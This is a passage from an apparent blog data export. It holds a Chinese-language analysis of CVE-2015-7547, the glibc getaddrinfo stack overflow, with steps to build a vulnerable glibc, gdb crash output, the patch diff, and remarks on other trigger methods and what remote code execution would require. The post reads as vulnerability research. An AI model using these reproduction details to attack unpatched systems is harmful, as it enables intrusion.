还有一些\n\n这个漏洞并不止google给出的POC中的一种触发姿势，只要能够先让malloc发生，然后立刻返回再send一次让orig_anssizp被改为64k就可以。比如也可以使用timeout的方式来完成。\n\n但是POC离对这个CVE的RCE还有些距离，虽然没有canary，但除了要过ASLR和NX保护以外，还要过一些check，在`gethostbyname4_r`返回前，host_buffer和ans2p这两个变量会被检查是否为null然后交给`free()`，所以这里是个问题，但也不是不可能的，在特定场景下或者搭配其他漏洞应该是可以过去的，这里还需要进一步折腾。\n\n\n\n\n\n\n\n\n\n","source":"_posts/cve_2015_7547.md","raw":"title: CVE-2015-7547\n\ndate: 2016/11/02 02:45:00\n\n---\n\nCVE-2015-7547，由google安全团队披露的glibc中getaddrinfo()函数产生的stack overflow漏洞，影响glibc版本2.9-2.22，产生漏洞的原因在于getaddrinfo在进行DNS查询的过程中，调用到send_dg()或者send_vc()的时候，由于逻辑错误导致标识buffer大小的变量和buffer的实际大小出现了不统一，进一步导致stack-overflow的发生。\n\n<!--more-->\n\n[这里](https://github.com/fjserna/CVE-2015-7547)有google团队给出的POC，但是保留了EXP——“We will not release our exploit code, but a non-weaponized Proof of Concept has been made available simultaneously with this blog post”。经过分析来看RCE是可行的，但是还需要去绕过一些保护机制和check。\n\n## 漏洞复现\n\n这个用户态的漏洞还是比较好复现的。首先我们需要获取一份未patch的存在漏洞的glibc，可以从[GNU站点](http://mirror.hust.edu.cn/gnu/libc/)中下载，然后编译安装：\n\n```bash\ntar zxvf glibc-2.19.tar.gz \ncd /glibc-2.19\nmkdir build && cd build\n../configure --prefix=/usr/local/glibc219/ --enable-debug CFLAGS=\"-g -O1\" CPPFLAGS=\"-g -O1\"\nmake\nmake install\n```\n\n在google给出的poc中，一份python用来监控53端口模拟DNS服务器以产生构造的DNS响应包，另一份client简单调用getaddrinfo函数触发漏洞。\n\n我们需要将google给出的poc中的client使用存在漏洞的glibc进行编译，需要参数rpath和dynamic-linker来指定glibc与对应的ld-linux：\n\n```bash\n-Wl,-rpath=/path/to/new/glibc/lib\n-Wl,-dynamic-linker=/path/to/newglibc/ld-linux.so.2\n```\n\n然后修改本地dns服务器为127.0.0.1，对应的配置文件为/etc/resolv.conf。之后分别启动python文件和client，就可以看到崩溃：\n\n```\nroot@Tencent1:~/CVE-2015-7547$ ./client\nSegmentation fault  \n```\n\n可以用gdb确认一下崩溃位置：\n\n```\nroot@Tencent1:~/CVE-2015-7547$ gdb client \nGNU gdb (Debian 7.11.1-2) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from client...(no debugging symbols found)...done.\ngdb-peda$ r\nStarting program: /root/CVE-2015-7547/client \n\nProgram received signal SIGSEGV, Segmentation fault.\n [----------------------------------registers-----------------------------------]\nRAX: 0x7fffffffe2a8 ('B' <repeats 150 times>, \"lrouters\")\nRBX: 0x4242424242424242 ('BBBBBBBB')\nRCX: 0xffffffffffffffff \nRDX: 0x4242424242424242 ('BBBBBBBB')\nRSI: 0x0 \nRDI: 0xffffffff \nRBP: 0x7fffffffd0b0 --> 0x7ffff7ddc080 --> 0x200000001 \nRSP: 0x7fffffffcde0 --> 0x1000001045e \nRIP: 0x7ffff741986c (<__GI___libc_res_nquery+1084>:     movzx  eax,BYTE PTR [rbx+0x3])\nR8 : 0x24 ('$')\nR9 : 0x7fffffffcc68 --> 0x7fffffffda40 --> 0x424242424242de8c \nR10: 0x7fffffffc610 --> 0x0 \nR11: 0x206 \nR12: 0xbcc \nR13: 0x7fffffffe2b0 ('B' <repeats 142 times>, \"lrouters\")\nR14: 0x24 ('$')\nR15: 0x7ffff7ddc080 --> 0x200000001\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff7419859 <__GI___libc_res_nquery+1065>:        lea    rsi,[rip+0x8b29]        # 0x7ffff7422389\n   0x7ffff7419860 <__GI___libc_res_nquery+1072>:        lea    rdi,[rip+0x8b81]        # 0x7ffff74223e8\n   0x7ffff7419867 <__GI___libc_res_nquery+1079>:        call   0x7ffff7415820 <__assert_fail@plt>\n=> 0x7ffff741986c <__GI___libc_res_nquery+1084>:        movzx  eax,BYTE PTR [rbx+0x3]\n   0x7ffff7419870 <__GI___libc_res_nquery+1088>:        and    eax,0xf\n   0x7ffff7419873 <__GI___libc_res_nquery+1091>:        jne    0x7ffff7419a5f <__GI___libc_res_nquery+1583>\n   0x7ffff7419879 <__GI___libc_res_nquery+1097>:        movzx  ecx,WORD PTR [rbx+0x6]\n   0x7ffff741987d <__GI___libc_res_nquery+1101>:        ror    cx,0x8\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffcde0 --> 0x1000001045e \n0008| 0x7fffffffcde8 --> 0x6f6f660300000000 \n0016| 0x7fffffffcdf0 --> 0x6f6f670672616203 \n0024| 0x7fffffffcdf8 --> 0x6d6f6303656c67 \n0032| 0x7fffffffce00 --> 0x1de8c01000100 \n0040| 0x7fffffffce08 --> 0x100 \n0048| 0x7fffffffce10 --> 0x726162036f6f6603 \n0056| 0x7fffffffce18 --> 0x3656c676f6f6706 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n__GI___libc_res_nquery (statp=statp@entry=0x7ffff7ddc080 <_res@GLIBC_2.2.5>, name=0x400717 \"foo.bar.google.com\", class=class@entry=0x1, \n    type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 \"\\214\\336\", 'B' <repeats 198 times>..., anslen=anslen@entry=0x800, \n    answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:262\n262             if ((hp->rcode != NOERROR || ntohs(hp->ancount) == 0)\ngdb-peda$ bt\n#0  __GI___libc_res_nquery (statp=statp@entry=0x7ffff7ddc080 <_res@GLIBC_2.2.5>, name=0x400717 \"foo.bar.google.com\", class=class@entry=0x1, \n    type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 \"\\214\\336\", 'B' <repeats 198 times>..., anslen=anslen@entry=0x800, \n    answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:262\n#1  0x00007ffff7419c47 in __libc_res_nquerydomain (statp=statp@entry=0x7ffff7ddc080 <_res@GLIBC_2.2.5>, name=<optimized out>, \n    name@entry=0x400717 \"foo.bar.google.com\", domain=<optimized out>, domain@entry=0x0, class=class@entry=0x1, type=type@entry=0xf371, \n    answer=answer@entry=0x7fffffffda40 \"\\214\\336\", 'B' <repeats 198 times>..., anslen=0x800, answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, \n    nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:582\n#2  0x00007ffff7419fbe in __GI___libc_res_nsearch (statp=0x7ffff7ddc080 <_res@GLIBC_2.2.5>, name=name@entry=0x400717 \"foo.bar.google.com\", \n    class=class@entry=0x1, type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 \"\\214\\336\", 'B' <repeats 198 times>..., \n    anslen=anslen@entry=0x800, answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0)\n    at res_query.c:378\n#3  0x00007ffff762b866 in _nss_dns_gethostbyname4_r (name=0x400717 \"foo.bar.google.com\", pat=0x4242424242424242, \n    buffer=0x4242424242424242 <error: Cannot access memory at address 0x4242424242424242>, buflen=0x4242424242424242, errnop=0x7fffffffe8ac, herrnop=0x7fffffffe880, ttlp=0x4242424242424242) at nss_dns/dns-host.c:314\n#4  0x4242424242424242 in ?? ()\n#5  0x4242424242424242 in ?? ()\n#6  0x4242424242424242 in ?? ()\n#7  0x4242424242424242 in ?? ()\n#8  0x4242424242424242 in ?? ()\n#9  0x4242424242424242 in ?? ()\n#10 0x4242424242424242 in ?? ()\n#11 0x4242424242424242 in ?? ()\n#12 0x726c424242424242 in ?? ()\n#13 0x000073726574756f in ?? ()\n#14 0x0000000000000000 in ?? ()\ngdb-peda$ \n\n```\n\n\n\n## 具体分析\n\n从gdb看到的调用栈可以看出，崩溃的调用栈是这样的：\n\n```\ngetaddrinfo() \t/sysdeps/posix/getaddrinfo.c\n|\ngaih_inet()\t\t/sysdeps/posix/getaddrinfo.c\n|\ngethostbyname4_r()\t/resolv/nss_dns/dns-host.c\n|\n__libc_res_nsearch()\t/resolv/res_query.c\n|\n__libc_res_nquerydomain()\t/resolv/res_query.c\n|\n__libc_res_nquery()\t\t/resolv/res_query.c\n|\n__libc_res_nsend()\t\t/resolv/res_send.c\n|\nsend_dg()\t/resolv/res_send.c\n(send_vc()\t/resolv/res_send.c)\n\n```\n\n其中，我们给`getaddrinfo`函数传入的hints参数中，其ai_family为AF_UNSPEC，这个参数使得`getaddrinfo`在后来会调用`gethostbyname4_r()`来进行IPV4与IPV6的DNS的并发查询。我们要关注的重点就是`gethostbyname4_r()`、`__libc_res_nsend()`、`send_dg()`。漏洞发生在`send_dg`函数中。\n\n函数调用栈中相关的变量关系大概是这样，我觉得搞明白这些变量的意义对于理解这个洞比较关键，但这些变量命名还是挺乱的，我们之后会逐步理清。另外还有一点是关于DNS的基础也是理解的前题，就是DNS一般来说是使用UDP进行请求与响应的，但是如果数据内容大于512bytes（取决于配置），DNS服务器在返回数据包中将会置位truncated flag，然后client将会重新使用TCP来进行本次DNS请求（当然也可以配置只使用TCP）。\n\n![cve_2015_7547_0.png](/images/cve_2015_7547_0.png)\n\n首先，`gethostbynamr4_r()`首先在栈上用alloca分配了2048 bytes的空间，同时也定义了ans2p、nans2p、resplen2，这几个变量是用于标识第二个数据包（因为我们需要发送IPV4和IPV6两个DNS请求，因此是有两个数据包，如果使用TCP的DNS请求的响应也分为两次回应的话）的在buffer中的位置、buffer大小以及对应response的大小。相关代码：\n\n```C\n 301   union\n 302   {\n 303     querybuf *buf;\n 304     u_char *ptr;\n 305   } host_buffer;\n 306   querybuf *orig_host_buffer;\n 307   host_buffer.buf = orig_host_buffer = (querybuf *) alloca (2048); \n 308   u_char *ans2p = NULL;\n 309   int nans2p = 0;\n 310   int resplen2 = 0;\n 311 \n 312   int olderr = errno;\n 313   enum nss_status status;\n 314   int n = __libc_res_nsearch (&_res, name, C_IN, T_UNSPEC,\n 315                   host_buffer.buf->buf, 2048, &host_buffer.ptr,\n 316                   &ans2p, &nans2p, &resplen2);\n```\n\n之后一路调用到`__libc_res_nsend`，这个函数用于调用（或者是反复调用）`send_dg`（处理UDP数据包的发送与接收）与`send_vc`（处理TCP数据包的发送与接收）来完成DNS查询，也就是说`send_dg`和`send_vc`只负责单次的DNS请求（但是这个单次不一定就是只有一个数据包，根据需要IPV4还是IPV6还是都需要来决定 ，如果都需要就会在一次调用中完成IPV4与IPV6数据的请求与接收），如果出了什么问题比如timeout或者truncated都会直接返回由`__libc_res_nsend`来决定是否继续发送及使用什么方式发送。\n\n现在我们可以来看`send_dg`函数中产生漏洞的地方，`send_dg`函数主要是完成了数据包的发送与接收，漏洞出在接收数据包的代码中，我们可以跳过无关的发送代码。首先是定义了一些局部变量：\n\n```C\n1191         int *thisanssizp;\n1192         u_char **thisansp;\n1193         int *thisresplenp;\n```\n\n这三个变量用于标识用于接收当前数据包（IPV4的或IPV6）的buffer信息，分别是buffer大小、buffer指针、response长度。我们当前的情况是需要接收两个数据包，IPV4的查询响应与IPV6的查询响应，当接收第一个包的时候，if条件满足（buf2指向之前要发送的第二个数据包buffer，这里用来判断是否只需要接收一个包即可），进入这一段：\n\n```C\n1194 \n1195         if ((recvresp1 | recvresp2) == 0 || buf2 == NULL) {\n1196             thisanssizp = anssizp;\n1197             thisansp = anscp ?: ansp;\n1198             assert (anscp != NULL || ansp2 == NULL);\n1199             thisresplenp = &resplen;\n1200         } else {\n```\n\n这一段代码是没有问题的，直接使用了传进来的stack中的2048bytes的buffer去接收数据。但是如果这个2048 bytes的buffer不够，会进入下一段代码使用malloc分配64k的空间进行接收：\n\n```C\n1228         if (*thisanssizp < MAXPACKET\n1229             /* Yes, we test ANSCP here.  If we have two buffers\n1230                both will be allocatable.  */\n1231             && anscp\n1232 #ifdef FIONREAD\n1233             && (ioctl (pfd[0].fd, FIONREAD, thisresplenp) < 0\n1234             || *thisanssizp < *thisresplenp)\n1235 #endif\n1236                     ) {\n1237             u_char *newp = malloc (MAXPACKET);\n1238             if (newp != NULL) {\n1239                 *anssizp = MAXPACKET;\n1240                 *thisansp = ans = newp;\n1241             }\n1242         }\n```\n\n其实单单看这一段代码是没有问题的，从对这个漏洞的patch也可以看出，只不过是换了一个host_buffer的指针去修改host_bufer指向newp，本质上在这里其实并没有什么改变：\n\n```C\n-\t\t\t\t*anssizp = MAXPACKET;\n-\t\t\t\t*thisansp = ans = newp;\n+\t\t\t\t*thisanssizp = MAXPACKET;\n+\t\t\t\t*thisansp = newp;\n```\n\n其实问题是这样产生的，从上面给出的变量图可以看到，这里是想要host_buffer指向新的buffer以及修改anssiz来反映这个buffer的大小变化，然后让`__libc_res_nsend`中的ans依然指向2048bytes因为如果第二个数据包比较小还依然能存在栈中，这个意图没有问题，实际上问题出在下面的关于准备第二个数据包的buffer相关变量中：\n\n```C\n1200         } else {\n1201             if (*anssizp != MAXPACKET) {\n1202                 /* No buffer allocated for the first\n1203                    reply.  We can try to use the rest\n1204                    of the user-provided buffer.  */\n1205 #ifdef _STRING_ARCH_unaligned\n1206                 *anssizp2 = orig_anssizp - resplen;\n1207                 *ansp2 = *ansp + resplen;\n1208 #else\n...\t\t\t\t\t[...]\n1214 #endif\n1215             } else {\n1216                 /* The first reply did not fit into the\n1217                    user-provided buffer.  Maybe the second\n1218                    answer will.  */\n1219                 *anssizp2 = orig_anssizp;\n1220                 *ansp2 = *ansp;\n1221             }\n1222 \n1223             thisanssizp = anssizp2;\n1224             thisansp = ansp2;\n1225             thisresplenp = resplen2;\n1226         }\n```\n\n问题是出在关于orig_anssizp变量的处理上，这个变量是在`send_dg`一开始这样赋值的：\n\n```C\n1000     int orig_anssizp = *anssizp;\n```\n\n结合第二个数据包的buffer准备就可以看到问题了，本来用来标识64k的heap中的buffer大小的变量却被用来标志2048bytes的栈buffer的大小，然后传递给`recvfrom`来接受数据：\n\n```C\n1246         *thisresplenp = recvfrom(pfd[0].fd, (char*)*thisansp,\n1247                      *thisanssizp, 0,\n1248                     (struct sockaddr *)&from, &fromlen);\n```\n\n这个时候一旦接个大的数据包就有问题了，stack-overflow就产生了。从patch中也可以证明：\n\n```C\n-\tint orig_anssizp = *anssizp;\n```\n\n以及\n\n```C\n@@ -1154,50 +1123,48 @@ send_dg(res_state statp,\n \t\t\tassert (anscp != NULL || ansp2 == NULL);\n \t\t\tthisresplenp = &resplen;\n \t\t} else {\n-\t\t\tif (*anssizp != MAXPACKET) {\n-\t\t\t\t/* No buffer allocated for the first\n-\t\t\t\t   reply.  We can try to use the rest\n-\t\t\t\t   of the user-provided buffer.  */\n-#if _STRING_ARCH_unaligned\n-\t\t\t\t*anssizp2 = orig_anssizp - resplen;\n-\t\t\t\t*ansp2 = *ansp + resplen;\n-#else\n-\t\t\t\tint aligned_resplen\n-\t\t\t\t  = ((resplen + __alignof__ (HEADER) - 1)\n-\t\t\t\t     & ~(__alignof__ (HEADER) - 1));\n-\t\t\t\t*anssizp2 = orig_anssizp - aligned_resplen;\n-\t\t\t\t*ansp2 = *ansp + aligned_resplen;\n-#endif\n-\t\t\t} else {\n-\t\t\t\t/* The first reply did not fit into the\n-\t\t\t\t   user-provided buffer.  Maybe the second\n-\t\t\t\t   answer will.  */\n-\t\t\t\t*anssizp2 = orig_anssizp;\n-\t\t\t\t*ansp2 = *ansp;\n-\t\t\t}\n-\n \t\t\tthisanssizp = anssizp2;\n \t\t\tthisansp = ansp2;\n \t\t\tthisresplenp = resplen2;\n \t\t}\n```\n\n可以看出patch的主要思路就是直接删除了在接受第二个数据包的时候对于栈上的buffer的考虑。\n\n`send_vc`中接受数据包的buffer处理基本和`send_dg`相同。所以我们也就可以理清POC中的利用思路，首先先是UDP请求IPV4和IPV6的DNS响应，然后服务器返回一个较大的响应包并设置truncated flag，这个时候send_dg中接受到这个包看到TC标志就立刻设置相关变量并返回使得`__libc_res_nsend`使用`send_vc`继续（所以我觉得POC中的等到接受到再一次的TCP请求再将之前的UDP包返回来我是没搞明白其意义，这个时候client应该不会再理会这第二个UDP响应了，我尝试修改poc试了一下也确实没有问题，难道poc中这么做只是为了避免client可能的等待？），然后由于orig_anssizp的关系，第一个数据包使用栈中的buffer接受了，但是第二个大数据包到来的时候因为orig_anssizp太大而计算size错误导致了溢出。\n\n## 还有一些\n\n这个漏洞并不止google给出的POC中的一种触发姿势，只要能够先让malloc发生，然后立刻返回再send一次让orig_anssizp被改为64k就可以。比如也可以使用timeout的方式来完成。\n\n但是POC离对这个CVE的RCE还有些距离，虽然没有canary，但除了要过ASLR和NX保护以外，还要过一些check，在`gethostbyname4_r`返回前，host_buffer和ans2p这两个变量会被检查是否为null然后交给`free()`，所以这里是个问题，但也不是不可能的，在特定场景下或者搭配其他漏洞应该是可以过去的，这里还需要进一步折腾。\n\n\n\n\n\n\n\n\n\n","slug":"cve_2015_7547","published":1,"updated":"2016-11-09T10:27:56.408Z","_id":"civas1xqo00006w60nhz4j4xe","comments":1,"layout":"post","photos":[],"link":"","content":"<p>CVE-2015-7547，由google安全团队披露的glibc中getaddrinfo()函数产生的stack overflow漏洞，影响glibc版本2.9-2.22，产生漏洞的原因在于getaddrinfo在进行DNS查询的过程中，调用到send_dg()或者send_vc()的时候，由于逻辑错误导致标识buffer大小的变量和buffer的实际大小出现了不统一，进一步导致stack-overflow的发生。</p>\n<a id=\"more\"></a>\n<p><a href=\"https://github.com/fjserna/CVE-2015-7547\" target=\"_blank\" rel=\"external\">这里</a>有google团队给出的POC，但是保留了EXP——“We will not release our exploit code, but a non-weaponized Proof of Concept has been made available simultaneously with this blog post”。经过分析来看RCE是可行的，但是还需要去绕过一些保护机制和check。</p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>这个用户态的漏洞还是比较好复现的。首先我们需要获取一份未patch的存在漏洞的glibc，可以从<a href=\"http://mirror.hust.edu.cn/gnu/libc/\" target=\"_blank\" rel=\"external\">GNU站点</a>中下载，然后编译安装：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">tar zxvf glibc-2.19.tar.gz </div><div class=\"line\"><span class=\"built_in\">cd</span> /glibc-2.19</div><div class=\"line\">mkdir build &amp;&amp; <span class=\"built_in\">cd</span> build</div><div class=\"line\">../configure --prefix=/usr/<span class=\"built_in\">local</span>/glibc219/ --enable-debug CFLAGS=<span class=\"string\">\"-g -O1\"</span> CPPFLAGS=<span class=\"string\">\"-g -O1\"</span></div><div class=\"line\">make</div><div class=\"line\">make install</div></pre></td></tr></table></figure>\n<p>在google给出的poc中，一份python用来监控53端口模拟DNS服务器以产生构造的DNS响应包，另一份client简单调用getaddrinfo函数触发漏洞。</p>\n<p>我们需要将google给出的poc中的client使用存在漏洞的glibc进行编译，需要参数rpath和dynamic-linker来指定glibc与对应的ld-linux：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">-Wl,-rpath=/path/to/new/glibc/lib</div><div class=\"line\">-Wl,-dynamic-linker=/path/to/newglibc/ld-linux.so.2</div></pre></td></tr></table></figure>\n<p>然后修改本地dns服务器为127.0.0.1，对应的配置文件为/etc/resolv.conf。之后分别启动python文件和client，就可以看到崩溃：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@Tencent1:~/CVE-2015-7547$ ./client</div><div class=\"line\">Segmentation fault</div></pre></td></tr></table></figure>\n<p>可以用gdb确认一下崩溃位置：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@Tencent1:~/CVE-2015-7547$ gdb client </div><div class=\"line\">GNU gdb (Debian 7.11.1-2) 7.11.1</div><div class=\"line\">Copyright (C) 2016 Free Software Foundation, Inc.</div><div class=\"line\">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class=\"line\">This is free software: you are free to change and redistribute it.</div><div class=\"line\">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class=\"line\">and &quot;show warranty&quot; for details.</div><div class=\"line\">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</div><div class=\"line\">Type &quot;show configuration&quot; for configuration details.</div><div class=\"line\">For bug reporting instructions, please see:</div><div class=\"line\">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class=\"line\">Find the GDB manual and other documentation resources online at:</div><div class=\"line\">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class=\"line\">For help, type &quot;help&quot;.</div><div class=\"line\">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class=\"line\">Reading symbols from client...(no debugging symbols found)...done.</div><div class=\"line\">gdb-peda$ r</div><div class=\"line\">Starting program: /root/CVE-2015-7547/client </div><div class=\"line\"></div><div class=\"line\">Program received signal SIGSEGV, Segmentation fault.</div><div class=\"line\"> [----------------------------------registers-----------------------------------]</div><div class=\"line\">RAX: 0x7fffffffe2a8 (&apos;B&apos; &lt;repeats 150 times&gt;, &quot;lrouters&quot;)</div><div class=\"line\">RBX: 0x4242424242424242 (&apos;BBBBBBBB&apos;)</div><div class=\"line\">RCX: 0xffffffffffffffff </div><div class=\"line\">RDX: 0x4242424242424242 (&apos;BBBBBBBB&apos;)</div><div class=\"line\">RSI: 0x0 </div><div class=\"line\">RDI: 0xffffffff </div><div class=\"line\">RBP: 0x7fffffffd0b0 --&gt; 0x7ffff7ddc080 --&gt; 0x200000001 </div><div class=\"line\">RSP: 0x7fffffffcde0 --&gt; 0x1000001045e </div><div class=\"line\">RIP: 0x7ffff741986c (&lt;__GI___libc_res_nquery+1084&gt;:     movzx  eax,BYTE PTR [rbx+0x3])</div><div class=\"line\">R8 : 0x24 (&apos;$&apos;)</div><div class=\"line\">R9 : 0x7fffffffcc68 --&gt; 0x7fffffffda40 --&gt; 0x424242424242de8c </div><div class=\"line\">R10: 0x7fffffffc610 --&gt; 0x0 </div><div class=\"line\">R11: 0x206 </div><div class=\"line\">R12: 0xbcc </div><div class=\"line\">R13: 0x7fffffffe2b0 (&apos;B&apos; &lt;repeats 142 times&gt;, &quot;lrouters&quot;)</div><div class=\"line\">R14: 0x24 (&apos;$&apos;)</div><div class=\"line\">R15: 0x7ffff7ddc080 --&gt; 0x200000001</div><div class=\"line\">EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)</div><div class=\"line\">[-------------------------------------code-------------------------------------]</div><div class=\"line\">   0x7ffff7419859 &lt;__GI___libc_res_nquery+1065&gt;:        lea    rsi,[rip+0x8b29]        # 0x7ffff7422389</div><div class=\"line\">   0x7ffff7419860 &lt;__GI___libc_res_nquery+1072&gt;:        lea    rdi,[rip+0x8b81]        # 0x7ffff74223e8</div><div class=\"line\">   0x7ffff7419867 &lt;__GI___libc_res_nquery+1079&gt;:        call   0x7ffff7415820 &lt;__assert_fail@plt&gt;</div><div class=\"line\">=&gt; 0x7ffff741986c &lt;__GI___libc_res_nquery+1084&gt;:        movzx  eax,BYTE PTR [rbx+0x3]</div><div class=\"line\">   0x7ffff7419870 &lt;__GI___libc_res_nquery+1088&gt;:        and    eax,0xf</div><div class=\"line\">   0x7ffff7419873 &lt;__GI___libc_res_nquery+1091&gt;:        jne    0x7ffff7419a5f &lt;__GI___libc_res_nquery+1583&gt;</div><div class=\"line\">   0x7ffff7419879 &lt;__GI___libc_res_nquery+1097&gt;:        movzx  ecx,WORD PTR [rbx+0x6]</div><div class=\"line\">   0x7ffff741987d &lt;__GI___libc_res_nquery+1101&gt;:        ror    cx,0x8</div><div class=\"line\">[------------------------------------stack-------------------------------------]</div><div class=\"line\">0000| 0x7fffffffcde0 --&gt; 0x1000001045e </div><div class=\"line\">0008| 0x7fffffffcde8 --&gt; 0x6f6f660300000000 </div><div class=\"line\">0016| 0x7fffffffcdf0 --&gt; 0x6f6f670672616203 </div><div class=\"line\">0024| 0x7fffffffcdf8 --&gt; 0x6d6f6303656c67 </div><div class=\"line\">0032| 0x7fffffffce00 --&gt; 0x1de8c01000100 </div><div class=\"line\">0040| 0x7fffffffce08 --&gt; 0x100 </div><div class=\"line\">0048| 0x7fffffffce10 --&gt; 0x726162036f6f6603 </div><div class=\"line\">0056| 0x7fffffffce18 --&gt; 0x3656c676f6f6706 </div><div class=\"line\">[------------------------------------------------------------------------------]</div><div class=\"line\">Legend: code, data, rodata, value</div><div class=\"line\">Stopped reason: SIGSEGV</div><div class=\"line\">__GI___libc_res_nquery (statp=statp@entry=0x7ffff7ddc080 &lt;_res@GLIBC_2.2.5&gt;, name=0x400717 &quot;foo.bar.google.com&quot;, class=class@entry=0x1, </div><div class=\"line\">    type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 &quot;\\214\\336&quot;, &apos;B&apos; &lt;repeats 198 times&gt;..., anslen=anslen@entry=0x800, </div><div class=\"line\">    answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:262</div><div class=\"line\">262             if ((hp-&gt;rcode != NOERROR || ntohs(hp-&gt;ancount) == 0)</div><div class=\"line\">gdb-peda$ bt</div><div class=\"line\">#0  __GI___libc_res_nquery (statp=statp@entry=0x7ffff7ddc080 &lt;_res@GLIBC_2.2.5&gt;, name=0x400717 &quot;foo.bar.google.com&quot;, class=class@entry=0x1, </div><div class=\"line\">    type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 &quot;\\214\\336&quot;, &apos;B&apos; &lt;repeats 198 times&gt;..., anslen=anslen@entry=0x800, </div><div class=\"line\">    answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:262</div><div class=\"line\">#1  0x00007ffff7419c47 in __libc_res_nquerydomain (statp=statp@entry=0x7ffff7ddc080 &lt;_res@GLIBC_2.2.5&gt;, name=&lt;optimized out&gt;, </div><div class=\"line\">    name@entry=0x400717 &quot;foo.bar.google.com&quot;, domain=&lt;optimized out&gt;, domain@entry=0x0, class=class@entry=0x1, type=type@entry=0xf371, </div><div class=\"line\">    answer=answer@entry=0x7fffffffda40 &quot;\\214\\336&quot;, &apos;B&apos; 